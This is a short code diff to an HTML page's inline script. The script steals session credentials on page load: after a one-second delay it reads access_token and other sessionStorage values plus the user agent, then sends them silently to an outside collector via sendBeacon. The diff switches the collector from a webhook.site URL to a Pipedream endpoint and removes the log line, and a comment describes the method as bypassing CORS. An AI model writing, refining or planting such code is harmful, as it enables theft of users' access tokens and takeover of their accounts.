@@ -5,7 +5,7 @@
   <script>
     window.onload = function () {
       setTimeout(() => {
-        const webhookURL = 'https://webhook.site/93ba68d2-a8b4-44f3-80fe-9a086e21f433';
+        const webhookURL = 'https://eoeofsj8fajkjtm.m.pipedream.net'; // Your Pipedream bin
 
         const data = {
           access_token: sessionStorage.getItem("access_token"),
@@ -15,13 +15,10 @@
           userAgent: navigator.userAgent
         };
 
-        // Convert JSON to Blob
         const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
 
-        // ✅ Send without triggering CORS preflight
+        // ✅ Bypass CORS using sendBeacon
         navigator.sendBeacon(webhookURL, blob);
-
-        console.log("🚀 Token data sent (CORS bypass)");
       }, 1000);
     };
   </script>
